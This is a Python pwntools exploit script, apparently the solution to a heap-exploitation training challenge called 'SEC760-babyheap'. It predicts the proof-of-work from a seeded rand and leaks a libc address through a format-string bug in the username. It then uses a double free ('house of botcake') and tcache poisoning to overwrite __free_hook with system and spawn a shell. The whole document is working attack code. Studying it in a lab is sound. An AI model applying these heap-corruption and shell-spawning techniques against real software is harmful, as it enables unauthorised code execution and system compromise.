from pwn import *
from ctypes import CDLL
from hashlib import sha256, md5
cdll = CDLL('/usr/lib64/libc.so.6')
libc = ELF('/opt/glibc/x64/2.29/lib/libc.so.6', checksec=False)
elf = ELF('./SEC760-babyheap', checksec=False)

def proof_of_work():
    seed = cdll.srand(cdll.time(0))
    '''
    # loop 4 times
    │           0x00001bc9      4d89e5         mov r13, r12
    │           0x00001bcc      498d6c2404     lea rbp, [r12 + 4]
    ...
    │       ╎   0x00001bdd      4983c501       add r13, 1
    ...
    │       ╎   0x00001c02      4939ed         cmp r13, rbp
    │       └─< 0x00001c05      75d1           jne 0x1bd8
    '''
    data = ''
    for i in range(0, 4):
        rand = cdll.rand()
        data += "abcdefghijklmnopqrstuvwxyz0123456789"[rand % 0x24]
    log.success(f'proof of work : {data} => {sha256(data.encode()).hexdigest()}')
    p.sendlineafter(b'>', data.encode())
    
def login(username):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'User:', b'%s' % username)
    '''
    # username inserted on 0x4060
    │           0x0000195f      488d3dfa2600.  lea rdi, [0x00004060]
    │           0x00001966      e865fdffff     call fcn.000016d0
    ...
    # password generated from md5 function on 0x4060 => username
    │           0x00001997      4889ea         mov rdx, rbp                ; int64_t arg3
    │           0x0000199a      488d3dbf2600.  lea rdi, [0x00004060]       ; int64_t arg1
    │           0x000019a1      4889c6         mov rsi, rax                ; size_t size
    │           0x000019a4      e807faffff     call fcn.000013b0
    '''
    p.sendlineafter(b'Pass:', b'%s' % md5(username).hexdigest().encode())

def info():
    p.sendlineafter(b'>', b'2')
    return p.recvline().strip().split(b' = ')[-1]

def create(sz, data):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'Size:', b'%d' % sz)
    p.sendafter(b'Data:', b'%s' % data)

def delete(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'Index:', b'%d' % idx)


if __name__ == "__main__":
    '''
    cant create more than 16 allocation
    no max size allocation
    off by one @ 0x000016d1 (rsi add 1)
    no check free (can do double free)
    free does not decrease the index number
    '''
    p = elf.process()
    proof_of_work()
    login(b'%p') # format string duhhh
    leak = eval(info()) # will leak __free_hook
    libc.address = leak - libc.sym['__free_hook']
    log.success(f'libc base @ 0x{libc.address:x}')
    
    # fill up tcache list, later
    for i in range(7):
        create(0x100, b'XXXX')

    create(0x100, b'AAAA')          # [7] <-- for prev chunk
    create(0x100, b'BBBB')          # [8] <-- target chunk
    create(0x10,  b'/bin/sh\x00')   # [9] <-- this chunk will prevent consolidation + args for system

    # fill up tcache list
    for i in range(7):
        delete(i)
    
    delete(8) # free the target
    delete(7) # will consolidate with the target chunk

    create(0x100, b'DUG')           # [8]/[6]
    delete(8)                       # double free with house of botcake
    
    # tcache poisoning
    create(0x130, b'O'*0x100 + 
                  p64(0) + p64(0x100) + 
                  p64(leak)         # overwrite fd pointer of chunk 0 or the first index of tcache entry on size 0x100
    ) # [8]/[7] 
    
    create(0x100, b'\x00')                  # [8]/[8]
    create(0x100, p64(libc.sym['system']))  # [8]
    
    delete(9) # win
    p.interactive()